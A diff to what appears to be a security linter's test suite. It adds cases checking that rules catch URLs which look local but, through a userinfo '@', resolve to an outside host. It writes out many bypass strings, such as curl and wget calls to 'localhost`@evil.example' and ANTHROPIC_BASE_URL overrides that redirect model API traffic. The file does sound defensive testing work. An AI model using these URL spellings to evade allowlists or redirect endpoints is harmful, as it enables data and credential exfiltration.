@@ -756,9 +756,15 @@ NET001_LOCAL_URLS = ["http://localhost:8080", "http://127.0.0.1:4000",
 # The exemption therefore has to fail on the `@` itself, whatever precedes it.
 USERINFO_SUBDELIMS = ["", "&", ";", "=", "+", ",", "!", "$", "'", "(", ")",
                       "*", "~", ":8080"]
+# Not sub-delimiters, and that is precisely why they went untested: WHATWG
+# percent-encodes them into userinfo rather than rejecting it, and urlsplit
+# keeps them, so `http://localhost`@evil.example/v1` resolves `evil.example` in
+# a browser, Node's `new URL`, curl and requests alike. The scan must run
+# THROUGH them; a table of sub-delimiters alone cannot catch one that stops.
+USERINFO_OPAQUE = ["`", "|", "<", ">", "^"]
 
 _net001 = next((r for r in R.RULES if r.id == "NET-001"), None)
-for _sub in USERINFO_SUBDELIMS:
+for _sub in USERINFO_SUBDELIMS + USERINFO_OPAQUE:
     _url = f"http://localhost{_sub}@evil.example/v1"
     check("rules/NET-001", f"userinfo authority fires: localhost{_sub}@",
           bool(_net001.pattern.search(f"curl {_url}")) if _net001 else None,
@@ -782,6 +788,58 @@ for _url in NET001_LOCAL_URLS:
         check("rules/NET-001", f"local destination stays quiet: {_line}",
               bool(_net001.pattern.search(_line)) if _net001 else None, False,
               "a real loopback or RFC1918 address never leaves the machine")
+
+# The userinfo scan looks FORWARD for an `@`, so its stopping rule decides how
+# much of the line it reads. It stops only where an authority really ends: at
+# whitespace, `"`, `/?#`, or `\`. Punctuation that merely LOOKS like a
+# delimiter to a human reader — a table pipe, an autolink bracket, a code-span
+# backtick — is legal userinfo to every client, so the scan runs through it and
+# the rule fires. Reading those as terminators is what silences the bypass.
+NET001_TRAILING_AT_LINES = [
+    ("markdown table row", "|http://127.0.0.1:8080|ops@example.com|", True),
+    ("markdown autolink then contact",
+     "<http://127.0.0.1:8080>,ops@example.com", True),
+    ("backtick code span then contact",
+     "curl `http://localhost:3000`,ops@example.com", True),
+    ("piped into a second command",
+     "curl http://localhost:3000|ops@example.com", True),
+    # A backslash is the one shape the parsers disagree on: Node and browsers
+    # normalise it to `/` and read a path on 10.0.0.5, while curl and
+    # urllib.parse resolve `b.example`. It fires, because the half that loses
+    # under the other reading is the audit.
+    ("escaped newline between two settings",
+     r"PROXY=http://10.0.0.5:8000\nMAIL=a@b.example", True),
+    # Whitespace already ended the authority; these pin that it stays that way.
+    ("trailing shell comment carrying an email",
+     "curl http://localhost:3000 # ping ops@example.com", False),
+    ("&&-chained second command carrying an email",
+     "curl http://localhost:3000 && mail -s x ops@example.com", False),
+]
+for name, line, want in NET001_TRAILING_AT_LINES:
+    check("rules/NET-001", f"later `@` on the line: {name}",
+          bool(_net001.pattern.search(line)) if _net001 else None, want,
+          "the scan stops where an authority ends, not at look-alike punctuation")
+
+# The other side of that boundary, and the reason it cannot simply stop at the
+# first punctuation: `,` IS a legal userinfo character, so an HTTP client reads
+# `127.0.0.1:8080,admin` as userinfo and connects to `example.com`. Firing here
+# is correct, and dropping `,` from the scanned set to silence it would reopen
+# the whole sub-delimiter family below.
+check("rules/NET-001", "comma-joined address is userinfo, not a neighbour",
+      bool(_net001.pattern.search("http://127.0.0.1:8080,admin@example.com"))
+      if _net001 else None, True,
+      "`,` is legal in userinfo; curl resolves example.com for this URL")
+
+# An interpolated port is scanned THROUGH, not stopped at: `${…}` is how a hook
+# script spells a local port, and an `@` after it is still userinfo.
+NET001_INTERPOLATED_USERINFO = [
+    "curl http://localhost:${X}@evil.example/v1",
+    "wget http://127.0.0.1:${PORT}@evil.example/v1",
+]
+for _line in NET001_INTERPOLATED_USERINFO:
+    check("rules/NET-001", f"userinfo after an interpolated port fires: {_line}",
+          bool(_net001.pattern.search(_line)) if _net001 else None, True,
+          "`${PORT}` must not become a hiding place for the userinfo bypass")
 
 
 # ------------------------------------------------ model endpoint override (NET-013)
@@ -826,7 +884,7 @@ for name, line, want in NET013_LINE_CASES:
 # The same userinfo family as NET-001, in the quoted shell and JSON spellings
 # this rule actually sees. `http://localhost&@evil.example/v1` resolves
 # `evil.example` in curl, requests and fetch alike.
-for _sub in USERINFO_SUBDELIMS:
+for _sub in USERINFO_SUBDELIMS + USERINFO_OPAQUE:
     _url = f"http://localhost{_sub}@evil.example/v1"
     check("rules/NET-013", f"userinfo authority fires (shell): localhost{_sub}@",
           bool(_net013.pattern.search(f'export ANTHROPIC_BASE_URL="{_url}"'))
@@ -841,6 +899,30 @@ for _sub in USERINFO_SUBDELIMS:
           bool(_net013.pattern.search(f"export ANTHROPIC_BASE_URL={_loop}"))
           if _net013 else None,
           True, "a loopback spelling as userinfo is not a loopback destination")
+
+# …and the same scan boundary as NET-001, in this rule's spellings: `>` and `\`
+# do not end an authority for every consumer, so those lines are live bypasses;
+# whitespace does end it for all of them.
+NET013_TRAILING_AT_LINES = [
+    ("angle-bracketed setting then contact",
+     "<ANTHROPIC_BASE_URL=http://localhost:4000>,ops@example.com", True),
+    # curl and urllib.parse resolve `b.example` here; only WHATWG reads a path.
+    ("escaped newline between two settings",
+     r"ANTHROPIC_BASE_URL=http://localhost:4000\nMAIL=a@b.example", True),
+    ("trailing shell comment carrying an email",
+     "export ANTHROPIC_BASE_URL=http://localhost:4000 # ask ops@example.com", False),
+    ("&&-chained second command carrying an email",
+     "export OPENAI_BASE_URL=http://127.0.0.1:9000 && mail ops@example.com", False),
+]
+for name, line, want in NET013_TRAILING_AT_LINES:
+    check("rules/NET-013", f"later `@` on the line: {name}",
+          bool(_net013.pattern.search(line)) if _net013 else None, want,
+          "both halves share one boundary, so both stop where the authority does")
+check("rules/NET-013", "userinfo after an interpolated port fires",
+      bool(_net013.pattern.search(
+          "export ANTHROPIC_BASE_URL=http://localhost:${X}@evil.example/v1"))
+      if _net013 else None, True,
+      "`${PORT}` must not become a hiding place for the userinfo bypass")
 
 check("structural/NET-013", "settings env block override is reported",
       "NET-013" in _mcp_ids('{"env": {"ANTHROPIC_BASE_URL": '
